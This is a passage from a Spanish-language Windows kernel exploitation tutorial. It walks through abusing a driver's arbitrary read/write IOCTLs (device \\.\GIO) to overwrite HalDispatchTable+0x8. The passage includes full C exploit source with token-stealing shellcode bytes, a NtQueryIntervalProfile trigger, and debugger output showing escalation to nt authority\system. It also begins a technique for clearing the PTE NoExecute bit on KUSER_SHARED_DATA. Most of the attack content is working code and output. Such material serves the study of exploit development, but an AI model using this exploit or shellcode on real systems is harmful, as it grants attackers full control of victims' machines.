<p class="plain-text">Luego de algunas validaciones la función <code class="language-plaintext highlighter-rouge">_guard_dispatch_icall</code> termina ejecutando un <code class="language-plaintext highlighter-rouge">jmp rax</code> por lo que salta al puntero dentro de la dirección <code class="language-plaintext highlighter-rouge">HalDispatchTable+0x8</code>, modificamos el valor dentro de esa dirección y llamamos a <code class="language-plaintext highlighter-rouge">NtQueryIntervalProfile</code> entonces al llegar al <code class="language-plaintext highlighter-rouge">jmp rax</code> se ejecutará lo que escribimos en esa dirección.</p>
<a href="/exploit-development/windows-kernel/arbitrary-write/18.png" target="_blank"><div><p><img src="/exploit-development/windows-kernel/arbitrary-write/18.png"></p></div></a>

<p class="plain-text">Iniciamos por importar la función <code class="language-plaintext highlighter-rouge">NtQueryIntervalProfile</code>, los argumentos realmente no nos interesan, simplemente le pasamos un entero y un puntero a algún <code class="language-plaintext highlighter-rouge">dword</code>.</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="no">typedef </span><span class="p">NTSTATUS(</span><span class="na">WINAPI</span><span class="o"> *</span><span class="p">NtQueryIntervalProfile_t) (
    </span><span class="p">IN</span><span class="na"> ULONG</span><span class="p"> ProfileSource,
    </span><span class="p">OUT</span><span class="na"> PULONG</span><span class="p"> Interval
);

NtQueryIntervalProfile_t NtQueryIntervalProfile </span><span class="o">= </span><span class="p">(NtQueryIntervalProfile_t) GetProcAddress(GetModuleHandleA(</span><span class="s">"ntdll.dll"</span><span class="p">), </span><span class="s">"NtQueryIntervalProfile"</span><span class="p">);</span>
</code></pre></div></div><br>

<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="na">DWORD </span><span class="p">interval;
NtQueryIntervalProfile(</span><span class="mi">0x10</span><span class="p">,</span><span class="o"> &</span><span class="p">interval);</span>
</code></pre></div></div><br>

<p class="plain-text">Entonces, iniciamos obteniendo la dirección de la <code class="language-plaintext highlighter-rouge">HalDispatchTable</code>, esto basados en la misma primitiva con la que obtuvimos <code class="language-plaintext highlighter-rouge">PsInitlalSystemProcess</code> anteriormente.</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="na">QWORD GetHalDispatchTable</span><span class="p">(</span><span class="na">QWORD</span><span class="ra"> kernelBase</span><span class="p">) {
    </span><span class="na">HMODULE</span><span class="p"> hKernel</span><span class="o"> =</span><span class="p"> LoadLibraryA(</span><span class="s">"C:</span><span class="mi">\\</span><span class="s">Windows</span><span class="mi">\\</span><span class="s">System32</span><span class="mi">\\</span><span class="s">ntoskrnl.exe"</span><span class="p">);

    </span><span class="na">QWORD</span><span class="p"> userHalDispatchTable</span><span class="o"> =</span><span class="p"> (</span><span class="na">QWORD</span><span class="p">) GetProcAddress(hKernel, </span><span class="s">"HalDispatchTable"</span><span class="p">);
    </span><span class="na">QWORD</span><span class="p"> offsetHalDispatchTable</span><span class="o"> =</span><span class="p"> userHalDispatchTable</span><span class="o"> -</span><span class="p"> (</span><span class="na">QWORD</span><span class="p">) hKernel;
    </span><span class="na">QWORD</span><span class="p"> kernelHalDispatchTable</span><span class="o"> =</span><span class="p"> kernelBase</span><span class="o"> +</span><span class="p"> offsetHalDispatchTable;

    FreeLibrary(hKernel);
    </span><span class="o">return</span><span class="p"> kernelHalDispatchTable;
}</span>
</code></pre></div></div><br>

<p class="plain-text">Iniciamos guardando el valor original dentro de <code class="language-plaintext highlighter-rouge">HalDispatchTable + 0x8</code>, ahora solo reservamos un espacio en memoria y movemos el <code class="language-plaintext highlighter-rouge">shellcode</code> a esa dirección, y para finalizar cambiamos en valor en <code class="language-plaintext highlighter-rouge">HalDispatchTable + 0x8</code> por la dirección de nuestro <code class="language-plaintext highlighter-rouge">shellcode</code>, luego llamamos a <code class="language-plaintext highlighter-rouge">NtQueryIntervalProfile</code> el cual ejecutará nuestro shellcode, terminamos por restaurar el valor original en <code class="language-plaintext highlighter-rouge">HalDispatchTable + 0x8</code>.</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="no">int</span><span class="na"> main</span><span class="p">() {
    </span><span class="na">HANDLE</span><span class="p"> hDevice</span><span class="o"> =</span><span class="p"> CreateFileA(</span><span class="s">"</span><span class="mi">\\\\</span><span class="s">.</span><span class="mi">\\</span><span class="s">GIO"</span><span class="p">, GENERIC_READ </span><span class="o">| </span><span class="p">GENERIC_WRITE, </span><span class="mi">0</span><span class="p">,</span><span class="mi"> NULL</span><span class="p">,</span><span class="mi"> OPEN_EXISTING</span><span class="p">,</span><span class="mi"> 0</span><span class="p">, </span><span class="mi">NULL</span><span class="p">);

    </span><span class="o">if</span><span class="p"> (hDevice</span><span class="o"> ==</span><span class="p"> INVALID_HANDLE_VALUE) {
        </span><span class="no">printf</span><span class="p">(</span><span class="s">"[-] Failed to get handle: 0x</span><span class="mi">%x\n</span><span class="s">"</span><span class="p">, GetLastError());
        </span><span class="no">exit</span><span class="p">(EXIT_FAILURE);
    }

    </span><span class="na">QWORD</span><span class="p"> kernelBase</span><span class="o"> =</span><span class="p"> GetKernelBase();

    </span><span class="na">QWORD</span><span class="p"> kernelHalDispatchTable</span><span class="o"> =</span><span class="p"> GetHalDispatchTable(kernelBase);
    </span><span class="na">QWORD</span><span class="p"> backupHalPointer</span><span class="o"> =</span><span class="p"> ArbitraryRead(hDevice, kernelHalDispatchTable </span><span class="o">+ </span><span class="mi">0x8</span><span class="p">);

    </span><span class="na">QWORD</span><span class="p"> shellcode</span><span class="o"> =</span><span class="p"> AllocMemory(hDevice,</span><span class="o"> sizeof</span><span class="p">(tokenStealing));
    ArbitraryWrite(hDevice, (</span><span class="na">QWORD</span><span class="p">)</span><span class="o"> &</span><span class="p">tokenStealing, shellcode,</span><span class="o"> sizeof</span><span class="p">(tokenStealing));

    </span><span class="no">printf</span><span class="p">(</span><span class="s">"[*] Hal Pointer Value: 0x</span><span class="mi">%llx\n</span><span class="s">"</span><span class="p">, backupHalPointer);
    </span><span class="no">printf</span><span class="p">(</span><span class="s">"[*] Shellcode Address: 0x</span><span class="mi">%llx\n</span><span class="s">"</span><span class="p">, shellcode);
    </span><span class="no">getchar</span><span class="p">();

    ArbitraryWrite(hDevice, (</span><span class="na">QWORD</span><span class="p">)</span><span class="o"> &</span><span class="p">shellcode, kernelHalDispatchTable </span><span class="o">+ </span><span class="mi">0x8</span><span class="p">,</span><span class="mi"> 0x8</span><span class="p">);
    </span><span class="no">getchar</span><span class="p">();

    </span><span class="na">DWORD</span><span class="p"> interval;
    NtQueryIntervalProfile(</span><span class="mi">0x10</span><span class="p">,</span><span class="o"> &</span><span class="p">interval);

    ArbitraryWrite(hDevice, (</span><span class="na">QWORD</span><span class="p">)</span><span class="o"> &</span><span class="p">backupHalPointer, kernelHalDispatchTable</span><span class="o"> +</span><span class="mi"> 0x8</span><span class="p">,</span><span class="mi"> 0x8</span><span class="p">);
    CloseHandle(hDevice);

    </span><span class="no">system</span><span class="p">(</span><span class="s">"cmd.exe"</span><span class="p">);
    </span><span class="o">return</span><span class="mi"> 0</span><span class="p">;
}</span>
</code></pre></div></div><br>

<p class="plain-text">Ejecutamos el exploit y al llegar al primer <code class="language-plaintext highlighter-rouge">getchar()</code> nos muestra el valor original en <code class="language-plaintext highlighter-rouge">HalDisPatchTable + 0x8</code> y la dirección donde se encuentra nuestro shellcode.</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="p">C:\Users\user\Desktop></span><span class="am"> exploit.exe</span><span class="p">
[*] Hal Pointer Value: 0xfffff8074df8f9d0
[*] Shellcode Address: 0xffffe281fe68e000</span>
</code></pre></div></div><br>

<p class="plain-text">Si miramos lo que contiene la primera dirección como aún no hemos modificado el valor apunta a <code class="language-plaintext highlighter-rouge">HaliQuerySystemInformation</code> y la segunda apunta hacia el shellcode.</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0: kd></span><span class="p"> dqs nt!HalDispatchTable + 0x8 L1
fffff807`4e200a68  fffff807`4df8f9d0 nt!HaliQuerySystemInformation

</span><span class="ro">0: kd></span><span class="p"> u 0xffffe281fe68e000 L1
ffffe281`fe68e000 65488b142588010000 mov   rdx,qword ptr gs:[188h]</span>
</code></pre></div></div><br>

<p class="plain-text">Si continuamos la ejecución hasta el segundo <code class="language-plaintext highlighter-rouge">getchar()</code> vemos que la dirección dentro de <code class="language-plaintext highlighter-rouge">HalDispatchTable + 0x8</code> ahora tiene la dirección de nuestro shellcode.</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0: kd></span><span class="p"> dqs nt!HalDispatchTable + 0x8 L1
fffff807`4e200a68  ffffe281`fe68e000

</span><span class="ro">0: kd></span><span class="p"> u 0xffffe281fe68e000 L1
ffffe281`fe68e000 65488b142588010000 mov   rdx,qword ptr gs:[188h]</span>
</code></pre></div></div><br>

<p class="plain-text">Ponemos un breakpoint en el shellcode y al llamar a la API <code class="language-plaintext highlighter-rouge">NtQueryIntervalProfile</code> podemos ver que se empieza a ejecutar y termina la ejecución sin provocar errores.</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0: kd></span><span class="p"> bp poi(nt!HalDispatchTable + 8)

</span><span class="ro">0: kd></span><span class="p"> g
Breakpoint 0 hit
ffffe281`fe68e000 65488b142588010000 mov   rdx,qword ptr gs:[188h]

</span><span class="ro">0: kd></span><span class="p"> pt
ffffe281`fe68e03b c3              ret

</span><span class="ro">0: kd></span><span class="p"> p
nt!KeQueryIntervalProfile+0x3e:
fffff807`5fb34422 85c0            test    eax,eax</span>
</code></pre></div></div><br>

<p class="plain-text">Cuando terminamos la ejecución del <code class="language-plaintext highlighter-rouge">main</code> el puntero se restaura por el valor original.</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0: kd></span><span class="p"> dqs nt!HalDispatchTable + 0x8 L1
fffff807`4e200a68  fffff807`4df8f9d0 nt!HaliQuerySystemInformation</span>
</code></pre></div></div><br>

<p class="plain-text">Nuestro exploit cambió, reserva un espacio en el kernel y mueve ahí el shellcode, luego cambiamos el valor en <code class="language-plaintext highlighter-rouge">HalDispatchTable + 0x8</code> por la dirección de nuestro shellcode y terminamos llamando a <code class="language-plaintext highlighter-rouge">NtQueryIntervalProfile</code> para ejecutarlo.</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="o">#include</span><span class="s"> &ltwindows.h>
</span><span class="o">#include</span><span class="s"> &ltstdio.h>
</span><span class="o">#include</span><span class="s"> &ltpsapi.h>

</span><span class="o">#define</span><span class="na"> QWORD ULONGLONG

</span><span class="o">#define</span><span class="na"> IOCTL_COPY</span><span class="mi"> 0xC3502808
</span><span class="o">#define</span><span class="na"> IOCTL_ALLOC</span><span class="mi"> 0xC3502800

</span><span class="no">typedef struct</span><span class="p"> CopyData {
    </span><span class="na">QWORD</span><span class="p"> DstAddress;
    </span><span class="na">QWORD</span><span class="p"> SrcAddress;
    </span><span class="na">DWORD</span><span class="p"> Size;
} </span><span class="na">CopyData</span><span class="p">;

</span><span class="no">typedef </span><span class="p">NTSTATUS(</span><span class="na">WINAPI</span><span class="o"> *</span><span class="p">NtQueryIntervalProfile_t) (
    </span><span class="p">IN</span><span class="na"> ULONG</span><span class="p"> ProfileSource,
    </span><span class="p">OUT</span><span class="na"> PULONG</span><span class="p"> Interval
);

NtQueryIntervalProfile_t NtQueryIntervalProfile </span><span class="o">= </span><span class="p">(NtQueryIntervalProfile_t) GetProcAddress(GetModuleHandleA(</span><span class="s">"ntdll.dll"</span><span class="p">), </span><span class="s">"NtQueryIntervalProfile"</span><span class="p">);

</span><span class="na">BYTE</span><span class="p"> tokenStealing[</span><span class="mi">60</span><span class="p">]</span><span class="o"> =</span><span class="p"> {
    </span><span class="mi">0x65</span><span class="p">,</span><span class="mi"> 0x48</span><span class="p">,</span><span class="mi"> 0x8b</span><span class="p">,</span><span class="mi"> 0x14</span><span class="p">,</span><span class="mi"> 0x25</span><span class="p">,</span><span class="mi"> 0x88</span><span class="p">,</span><span class="mi"> 0x01</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="c1"> // mov rdx, [gs:0x188]              ; $rdx = _KTHREAD
    </span><span class="mi">0x48</span><span class="p">,</span><span class="mi"> 0x8b</span><span class="p">,</span><span class="mi"> 0x82</span><span class="p">,</span><span class="mi"> 0xb8</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="c1">             // mov rax, [rdx + 0xb8]            ; $rax = _EPROCESS
    </span><span class="mi">0x50</span><span class="p">,</span><span class="mi"> 0x5b</span><span class="p">,</span><span class="c1">                                           // mov rbx, rax                     ; $rbx = _EPROCESS
                                                          // .loop:
    </span><span class="mi">0x48</span><span class="p">,</span><span class="mi"> 0x8b</span><span class="p">,</span><span class="mi"> 0x9b</span><span class="p">,</span><span class="mi"> 0x48</span><span class="p">,</span><span class="mi"> 0x04</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="c1">             //     mov rbx, [rbx + 0x448]       ; $rbx = ActiveProcessLinks
    </span><span class="mi">0x48</span><span class="p">,</span><span class="mi"> 0x81</span><span class="p">,</span><span class="mi"> 0xeb</span><span class="p">,</span><span class="mi"> 0x48</span><span class="p">,</span><span class="mi"> 0x04</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="c1">             //     sub rbx, 0x448               ; $rbx = _EPROCESS
    </span><span class="mi">0x48</span><span class="p">,</span><span class="mi"> 0x83</span><span class="p">,</span><span class="mi"> 0xbb</span><span class="p">,</span><span class="mi"> 0x40</span><span class="p">,</span><span class="mi"> 0x04</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="mi"> 0x04</span><span class="p">,</span><span class="c1">       //     cmp qword [rbx + 0x440], 0x4 ; cmp PID to SYSTEM PID
    </span><span class="mi">0x75</span><span class="p">,</span><span class="mi"> 0xe8</span><span class="p">,</span><span class="c1">                                           //     jnz .loop                    ; if zf == 0 -> loop
    </span><span class="mi">0x48</span><span class="p">,</span><span class="mi"> 0x8b</span><span class="p">,</span><span class="mi"> 0x8b</span><span class="p">,</span><span class="mi"> 0xb8</span><span class="p">,</span><span class="mi"> 0x04</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="c1">             // mov rcx, [rbx + 0x4b8]           ; $rcx = SYSTEM token
    </span><span class="mi">0x80</span><span class="p">,</span><span class="mi"> 0xe1</span><span class="p">,</span><span class="mi"> 0xf0</span><span class="p">,</span><span class="c1">                                     // and cl, 0xf0                     ; clear _EX_FAST_REF struct
    </span><span class="mi">0x48</span><span class="p">,</span><span class="mi"> 0x89</span><span class="p">,</span><span class="mi"> 0x88</span><span class="p">,</span><span class="mi"> 0xb8</span><span class="p">,</span><span class="mi"> 0x04</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="c1">             // mov [rax + 0x4b8], rcx           ; store SYSTEM token in _EPROCESS
    </span><span class="mi">0xc3</span><span class="c1">                                                  // ret                              ; return
</span><span class="p">};

</span><span class="na">VOID ArbitraryWrite</span><span class="p">(</span><span class="na">HANDLE</span><span class="ra"> hDevice</span><span class="p">,</span><span class="na"> QWORD</span><span class="ra"> what</span><span class="p">,</span><span class="na"> QWORD</span><span class="ra"> where</span><span class="p">,</span><span class="na"> DWORD</span><span class="ra"> size</span><span class="p">) {
    CopyData userData;

    userData.DstAddress</span><span class="o"> =</span><span class="p"> where;
    userData.SrcAddress</span><span class="o"> =</span><span class="p"> what;
    userData.Size</span><span class="o"> =</span><span class="p"> size;

    DeviceIoControl(hDevice, IOCTL_COPY, (</span><span class="na">LPVOID</span><span class="p">) </span><span class="o">&</span><span class="p">userData, (</span><span class="na">DWORD</span><span class="p">) </span><span class="o">sizeof</span><span class="p">(</span><span class="no">struct</span><span class="p"> CopyData), </span><span class="mi">NULL</span><span class="p">,</span><span class="mi"> 0</span><span class="p">,</span><span class="mi"> NULL</span><span class="p">,</span><span class="mi"> NULL</span><span class="p">);
}

</span><span class="na">QWORD ArbitraryRead</span><span class="p">(</span><span class="na">HANDLE</span><span class="ra"> hDevice</span><span class="p">,</span><span class="na"> QWORD</span><span class="ra"> where</span><span class="p">) {
    </span><span class="na">QWORD</span><span class="p"> output;
    CopyData userData;

    userData.DstAddress </span><span class="o">=</span><span class="p"> (</span><span class="na">QWORD</span><span class="p">)</span><span class="o"> &</span><span class="p">output;
    userData.SrcAddress</span><span class="o"> =</span><span class="p"> where;
    userData.Size</span><span class="o"> =</span><span class="mi"> 8</span><span class="p">;

    DeviceIoControl(hDevice, IOCTL_COPY, (</span><span class="na">LPVOID</span><span class="p">)</span><span class="o"> &</span><span class="p">userData, (</span><span class="na">DWORD</span><span class="p">) </span><span class="o">sizeof</span><span class="p">(</span><span class="no">struct</span><span class="p"> CopyData), </span><span class="mi">NULL</span><span class="p">,</span><span class="mi"> 0</span><span class="p">,</span><span class="mi"> NULL</span><span class="p">,</span><span class="mi"> NULL</span><span class="p">);

    </span><span class="o">return</span><span class="p"> output;
}

</span><span class="na">QWORD AllocMemory</span><span class="p">(</span><span class="na">HANDLE</span><span class="ra"> hDevice</span><span class="p">,</span><span class="na"> DWORD</span><span class="ra"> size</span><span class="p">) {
    </span><span class="na">DWORD</span><span class="p"> input</span><span class="o"> =</span><span class="p"> size;
    </span><span class="na">QWORD</span><span class="p"> output[</span><span class="mi">2</span><span class="p">];

    DeviceIoControl(hDevice, IOCTL_ALLOC, (</span><span class="na">LPVOID</span><span class="p">)</span><span class="o"> &</span><span class="p">input,</span><span class="o"> sizeof</span><span class="p">(input), (</span><span class="na">LPVOID</span><span class="p">) output, </span><span class="o">sizeof</span><span class="p">(output), </span><span class="mi">0</span><span class="p">,</span><span class="mi"> NULL</span><span class="p">);

    </span><span class="o">return</span><span class="p"> output[</span><span class="mi">0</span><span class="p">];
}

</span><span class="na">QWORD GetHalDispatchTable</span><span class="p">(</span><span class="na">QWORD</span><span class="ra"> kernelBase</span><span class="p">) {
    </span><span class="na">HMODULE</span><span class="p"> hKernel</span><span class="o"> =</span><span class="p"> LoadLibraryA(</span><span class="s">"C:</span><span class="mi">\\</span><span class="s">Windows</span><span class="mi">\\</span><span class="s">System32</span><span class="mi">\\</span><span class="s">ntoskrnl.exe"</span><span class="p">);

    </span><span class="na">QWORD</span><span class="p"> userHalDispatchTable</span><span class="o"> =</span><span class="p"> (</span><span class="na">QWORD</span><span class="p">) GetProcAddress(hKernel, </span><span class="s">"HalDispatchTable"</span><span class="p">);
    </span><span class="na">QWORD</span><span class="p"> offsetHalDispatchTable</span><span class="o"> =</span><span class="p"> userHalDispatchTable</span><span class="o"> -</span><span class="p"> (</span><span class="na">QWORD</span><span class="p">) hKernel;
    </span><span class="na">QWORD</span><span class="p"> kernelHalDispatchTable</span><span class="o"> =</span><span class="p"> kernelBase</span><span class="o"> +</span><span class="p"> offsetHalDispatchTable;

    FreeLibrary(hKernel);
    </span><span class="o">return</span><span class="p"> kernelHalDispatchTable;
}

</span><span class="na">QWORD</span><span class="na"> GetKernelBase</span><span class="p">() {
    </span><span class="na">LPVOID</span><span class="p"> drivers[</span><span class="mi">1024</span><span class="p">];
    </span><span class="na">DWORD</span><span class="p"> cbNeeded;

    EnumDeviceDrivers(drivers, </span><span class="o">sizeof</span><span class="p">(drivers),</span><span class="o"> &</span><span class="p">cbNeeded);
    </span><span class="o">return</span><span class="p"> (</span><span class="na">QWORD</span><span class="p">) drivers[</span><span class="mi">0</span><span class="p">];
}

</span><span class="no">int</span><span class="na"> main</span><span class="p">() {
    </span><span class="na">HANDLE</span><span class="p"> hDevice</span><span class="o"> =</span><span class="p"> CreateFileA(</span><span class="s">"</span><span class="mi">\\\\</span><span class="s">.</span><span class="mi">\\</span><span class="s">GIO"</span><span class="p">, GENERIC_READ</span><span class="o"> |</span><span class="p"> GENERIC_WRITE, </span><span class="mi">0</span><span class="p">,</span><span class="mi"> NULL</span><span class="p">, OPEN_EXISTING,</span><span class="mi"> 0</span><span class="p">,</span><span class="mi"> NULL</span><span class="p">);

    </span><span class="o">if</span><span class="p"> (hDevice</span><span class="o"> ==</span><span class="p"> INVALID_HANDLE_VALUE) {
        </span><span class="no">printf</span><span class="p">(</span><span class="s">"[-] Failed to get handle: 0x</span><span class="mi">%x\n"</span><span class="p">, GetLastError());
        </span><span class="no">exit</span><span class="p">(EXIT_FAILURE);
    }

    </span><span class="na">QWORD</span><span class="p"> kernelBase</span><span class="o"> =</span><span class="p"> GetKernelBase();

    </span><span class="na">QWORD</span><span class="p"> kernelHalDispatchTable</span><span class="o"> =</span><span class="p"> GetHalDispatchTable(kernelBase);
    </span><span class="na">QWORD</span><span class="p"> backupHalPointer</span><span class="o"> =</span><span class="p"> ArbitraryRead(hDevice, kernelHalDispatchTable</span><span class="o"> +</span><span class="mi"> 0x8</span><span class="p">);

    </span><span class="na">QWORD</span><span class="p"> shellcode</span><span class="o"> =</span><span class="p"> AllocMemory(hDevice, </span><span class="o">sizeof</span><span class="p">(tokenStealing));
    ArbitraryWrite(hDevice, (</span><span class="na">QWORD</span><span class="p">)</span><span class="o"> &</span><span class="p">tokenStealing, shellcode,</span><span class="o"> sizeof</span><span class="p">(tokenStealing));
    ArbitraryWrite(hDevice, (</span><span class="na">QWORD</span><span class="p">)</span><span class="o"> &</span><span class="p">shellcode, kernelHalDispatchTable</span><span class="o"> +</span><span class="mi"> 0x8</span><span class="p">,</span><span class="mi"> 0x8</span><span class="p">);

    </span><span class="na">DWORD</span><span class="p"> interval;
    NtQueryIntervalProfile(</span><span class="mi">0x10</span><span class="p">,</span><span class="o"> &</span><span class="p">interval);

    ArbitraryWrite(hDevice, (</span><span class="na">QWORD</span><span class="p">) </span><span class="o">&</span><span class="p">backupHalPointer, kernelHalDispatchTable </span><span class="o">+</span><span class="mi"> 0x8</span><span class="p">, </span><span class="mi">0x8</span><span class="p">);
    CloseHandle(hDevice);

    </span><span class="no">system</span><span class="p">(</span><span class="s">"cmd.exe"</span><span class="p">);
    </span><span class="o">return</span><span class="mi"> 0</span><span class="p">;
}</span>
</code></pre></div></div><br>

<p class="plain-text">Al ejecutar el exploit logramos ejecutar un shellcode y pasamos del usuario <code class="language-plaintext highlighter-rouge">user</code> de bajos privilegios a <code class="language-plaintext highlighter-rouge">nt authority\system</code> que es el usuario con máximos privilegios.</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="p">C:\Users\user\Desktop> </span><span class="am">whoami</span><span class="p">
windows\user

C:\Users\user\Desktop> </span><span class="am">exploit.exe</span><span class="p">
Microsoft Windows [Versión 10.0.19045.6456]
(c) Microsoft Corporation. Todos los derechos reservados.

C:\Users\user\Desktop> </span><span class="am">whoami</span><span class="p">
nt authority\system

C:\Users\user\Desktop></span>
</code></pre></div></div><br>

</section>

<section class="post" id="shared">
<br><h3 class="post-title">KUSER_SHARED_DATA</h3><br>

<p class="plain-text">Antes usamos un espacio en memoria que afortunadamente el driver nos permitía reservar, ahora nos aprovecharemos de <code class="language-plaintext highlighter-rouge">KUSER_SHARED_DATA</code>, esta es una página de memoria de <code class="language-plaintext highlighter-rouge">4KB</code> que Windows ha mantenido con una dirección estática sin <code class="language-plaintext highlighter-rouge">kASLR</code>.</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0: kd></span><span class="p"> !kuser
_KUSER_SHARED_DATA at fffff78000000000
TickCount:    fa00000 * 0000000000004eb8 (0:00:05:14.875)
TimeZone Id: 1
ImageNumber Range: [8664 .. 8664]
Crypto Exponent: 0
SystemRoot: 'C:\Windows'
BootId: 72

</span><span class="ro">0: kd></span><span class="p"> dt nt!_KUSER_SHARED_DATA 0xfffff78000000000
   +0x000 TickCountLowDeprecated : 0
   +0x004 TickCountMultiplier : 0xfa00000
   +0x008 InterruptTime    : _KSYSTEM_TIME
   +0x014 SystemTime       : _KSYSTEM_TIME
   +0x020 TimeZoneBias     : _KSYSTEM_TIME
   +0x02c ImageNumberLow   : 0x8664
   +0x02e ImageNumberHigh  : 0x8664
   +0x030 NtSystemRoot     : [260]  "C:\Windows"
   ...............................................
   +0x3d8 XState           : _XSTATE_CONFIGURATION
   +0x710 FeatureConfigurationChangeStamp : _KSYSTEM_TIME
   +0x71c Spare            : 0</span>
</code></pre></div></div><br>

<p class="plain-text">La dirección siempre será <code class="language-plaintext highlighter-rouge">0xfffff78000000000</code> por lo que podriamos usarla en un exploit sin que nos afecte el <code class="language-plaintext highlighter-rouge">kASLR</code>, evitaremos modificar valores de esa estructura que es de <code class="language-plaintext highlighter-rouge">0x71c</code> bytes, podemos simplemente usar el espacio en el offset <code class="language-plaintext highlighter-rouge">0x800</code>.</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0: kd> </span><span class="p">db 0xfffff78000000000 + 0x800
fffff780`00000800  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................
fffff780`00000810  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................
fffff780`00000820  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................
fffff780`00000830  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................
fffff780`00000840  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................
fffff780`00000850  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................
fffff780`00000860  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................
fffff780`00000870  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................</span>
</code></pre></div></div><br>

<p class="plain-text">Si miramos las protecciones de la <code class="language-plaintext highlighter-rouge">PTE</code> de la dirección de <code class="language-plaintext highlighter-rouge">KUSER_SHARED_DATA + 0x800</code> nos dice que el bit <code class="language-plaintext highlighter-rouge">XD</code> o <code class="language-plaintext highlighter-rouge">NoExecute</code> está habilitado por lo que no podemos ejecutar código ahí, así que nuestro intento de ejecutar un <code class="language-plaintext highlighter-rouge">shellcode</code> no debería funcionar.</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0: kd> </span><span class="p">!pte 0xfffff78000000000 + 0x800
                                           VA fffff78000000800
PXE at FFFFC46231188F78    PPE at FFFFC462311EF000    PDE at FFFFC4623DE00000    PTE at FFFFC47BC0000000
contains 0000000005300063  contains 0000000005301063  contains 0000000005302063  contains 8000000005429963
pfn 5300      ---DA--KWEV  pfn 5301      ---DA--KWEV  pfn 5302      ---DA--KWEV  pfn 5429      -G-DA--KW-V

</span><span class="ro">0: kd></span><span class="p"> dt nt!_MMPTE_HARDWARE 0xffffc47bc0000000
   +0x000 Valid               : 0y1
   +0x000 Dirty1              : 0y1
   +0x000 Owner               : 0y0
   +0x000 WriteThrough        : 0y0
   +0x000 CacheDisable        : 0y0
   +0x000 Accessed            : 0y1
   +0x000 Dirty               : 0y1
   +0x000 LargePage           : 0y0
   +0x000 Global              : 0y1
   +0x000 CopyOnWrite         : 0y0
   +0x000 Unused              : 0y0
   +0x000 Write               : 0y1
   +0x000 PageFrameNumber     : 0y000000000000000000000101010000101001 (0x5429)
   +0x000 ReservedForHardware : 0y0000
   +0x000 ReservedForSoftware : 0y0000
   +0x000 WsleAge             : 0y0000
   +0x000 WsleProtection      : 0y000
   +0x000 NoExecute           : 0y1</span>
</code></pre></div></div><br>


<p class="plain-text">Para cualquier dirección el bit <code class="language-plaintext highlighter-rouge">63</code> de la <code class="language-plaintext highlighter-rouge">PTE</code> se encarga de la protección <code class="language-plaintext highlighter-rouge">XD</code> y ya tenemos una primitiva de escritura por lo que simplemente tenemos que cambiar el valor dentro de la <code class="language-plaintext highlighter-rouge">PTE</code> apagando ese bit entonces <code class="language-plaintext highlighter-rouge">NoExecute</code> estará deshabilitado.</p>
<a href="/exploit-development/windows-kernel/arbitrary-write/0.png" target="_blank"><div><p><img src="/exploit-development/windows-kernel/arbitrary-write/0.png"></p></div></a>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0: kd></span><span class="p"> dq 0xffffc47bc0000000 L1
ffffc47b`c0000000  80000000`05429963

</span><span class="ro">0: kd></span><span class="p"> ? 0x8000000005429963 ^ (1 << 0n63)
Evaluate expression: 88250723 = 00000000`05429963

</span><span class="ro">0: kd></span><span class="p"> eq 0xffffc47bc0000000
ffffc47b`c0000000 80000000`05429963 0x0000000005429963
ffffc47b`c0000008 00000000`00000000

</span><span class="ro">0: kd></span><span class="p"> dt nt!_MMPTE_HARDWARE 0xffffc47bc0000000
   +0x000 Valid               : 0y1
   +0x000 Dirty1              : 0y1
   +0x000 Owner               : 0y0
   +0x000 WriteThrough        : 0y0
   +0x000 CacheDisable        : 0y0
   +0x000 Accessed            : 0y1
   +0x000 Dirty               : 0y1
   +0x000 LargePage           : 0y0
   +0x000 Global              : 0y1
   +0x000 CopyOnWrite         : 0y0
   +0x000 Unused              : 0y0
   +0x000 Write               : 0y1
   +0x000 PageFrameNumber     : 0y000000000000000000000101010000101001 (0x5429)
   +0x000 ReservedForHardware : 0y0000
   +0x000 ReservedForSoftware : 0y0000
